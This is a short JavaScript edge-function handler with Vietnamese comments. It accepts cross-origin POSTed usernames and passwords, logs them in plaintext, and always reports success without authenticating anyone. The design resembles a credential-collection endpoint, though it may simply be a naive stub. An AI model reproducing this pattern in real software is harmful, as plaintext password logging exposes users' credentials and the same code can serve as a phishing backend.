export const config = {
  runtime: 'edge',
};

export default async function handler(req) {
  const { method } = req;

  // Kiểm tra phương thức OPTIONS để xử lý CORS
  if (method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }

  // Kiểm tra phương thức POST
  if (method === 'POST') {
    try {
      // Kiểm tra nếu dữ liệu có trong body không và phải là JSON
      const requestBody = await req.json();

      // Kiểm tra nếu dữ liệu có trường 'username' và 'password'
      const { username, password } = requestBody;

      if (!username || !password) {
        return new Response('Bad Request: Missing username or password', { status: 400 });
      }

      console.log('Nhận form:', { username, password });

      // Trả về phản hồi thành công
      return new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: {
          'Access-Control-Allow-Origin': '*',
        },
      });
    } catch (error) {
      console.error('Lỗi khi xử lý dữ liệu:', error);
      return new Response('Bad Request: Invalid JSON format', { status: 400 });
    }
  }

  // Nếu không phải là POST hoặc OPTIONS
  return new Response('Method Not Allowed', { status: 405 });
}
